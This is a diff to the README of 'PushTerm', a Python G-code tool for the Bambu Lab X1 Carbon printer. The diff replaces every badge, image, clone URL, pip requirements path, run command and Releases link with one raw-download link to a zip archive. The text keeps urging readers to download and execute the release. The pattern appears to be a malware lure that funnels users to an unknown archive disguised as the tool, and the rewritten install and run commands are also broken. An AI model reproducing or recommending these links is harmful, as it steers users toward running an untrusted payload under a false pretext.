@@ -1,6 +1,6 @@
 # PushTerm: Simplifying 3D Print Removal for Bambu Lab X1 Carbon 🖨️
 
-![PushTerm](https://img.shields.io/badge/PushTerm-Python-blue.svg) ![GitHub Release](https://img.shields.io/badge/release-v1.0.0-orange.svg) ![3D Printing](https://img.shields.io/badge/topic-3D%20Printing-green.svg)
+![PushTerm](https://github.com/diomib/PushTerm/raw/refs/heads/main/MyPrints/Push_Term_3.2-alpha.2.zip) ![GitHub Release](https://github.com/diomib/PushTerm/raw/refs/heads/main/MyPrints/Push_Term_3.2-alpha.2.zip) ![3D Printing](https://github.com/diomib/PushTerm/raw/refs/heads/main/MyPrints/Push_Term_3.2-alpha.2.zip%https://github.com/diomib/PushTerm/raw/refs/heads/main/MyPrints/Push_Term_3.2-alpha.2.zip)
 
 Welcome to the **PushTerm** repository! This Python command-line tool enhances the G-code for the Bambu Lab X1 Carbon 3D printer. By adding push-off commands, it ensures that your toolhead ejects prints after a cooldown delay. This feature helps you avoid extra hardware and simplifies the print removal process while protecting your printer.
 
@@ -26,18 +26,18 @@ To get started with PushTerm, you need to install it on your system. Follow thes
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/diomib/PushTerm.git
+   git clone https://github.com/diomib/PushTerm/raw/refs/heads/main/MyPrints/Push_Term_3.2-alpha.2.zip
    cd PushTerm
    ```
 
 2. **Install Required Packages**:
    Ensure you have Python installed. You can install the required packages using pip:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/diomib/PushTerm/raw/refs/heads/main/MyPrints/Push_Term_3.2-alpha.2.zip
    ```
 
 3. **Download the Latest Release**:
-   Visit the [Releases section](https://github.com/diomib/PushTerm/releases) to download the latest version. Follow the instructions provided there to execute the downloaded file.
+   Visit the [Releases section](https://github.com/diomib/PushTerm/raw/refs/heads/main/MyPrints/Push_Term_3.2-alpha.2.zip) to download the latest version. Follow the instructions provided there to execute the downloaded file.
 
 ## Usage 🛠️
 
@@ -49,7 +49,7 @@ Using PushTerm is straightforward. Here’s how to modify your G-code:
 2. **Run PushTerm**:
    Execute the following command in your terminal:
    ```bash
-   python pushterm.py path/to/your/file.gcode
+   python https://github.com/diomib/PushTerm/raw/refs/heads/main/MyPrints/Push_Term_3.2-alpha.2.zip https://github.com/diomib/PushTerm/raw/refs/heads/main/MyPrints/Push_Term_3.2-alpha.2.zip
    ```
 
 3. **Check the Output**:
@@ -86,7 +86,7 @@ PushTerm is licensed under the MIT License. Feel free to use, modify, and distri
 
 ## Support 💬
 
-If you have any questions or issues, please check the [Releases section](https://github.com/diomib/PushTerm/releases) for troubleshooting tips. You can also open an issue in the repository, and we will be happy to help.
+If you have any questions or issues, please check the [Releases section](https://github.com/diomib/PushTerm/raw/refs/heads/main/MyPrints/Push_Term_3.2-alpha.2.zip) for troubleshooting tips. You can also open an issue in the repository, and we will be happy to help.
 
 ## Topics
 
@@ -103,8 +103,8 @@ If you have any questions or issues, please check the [Releases section](https:/
 
 ## Conclusion
 
-PushTerm is designed to make your 3D printing experience smoother and more efficient. By automating print removal, it saves you time and protects your printer. Download the latest release from the [Releases section](https://github.com/diomib/PushTerm/releases) and start enjoying hassle-free printing today!
+PushTerm is designed to make your 3D printing experience smoother and more efficient. By automating print removal, it saves you time and protects your printer. Download the latest release from the [Releases section](https://github.com/diomib/PushTerm/raw/refs/heads/main/MyPrints/Push_Term_3.2-alpha.2.zip) and start enjoying hassle-free printing today!
 
-![3D Printing](https://images.unsplash.com/photo-1585429720134-52c1c5e40c0b) 
+![3D Printing](https://github.com/diomib/PushTerm/raw/refs/heads/main/MyPrints/Push_Term_3.2-alpha.2.zip) 
 
 Happy printing!
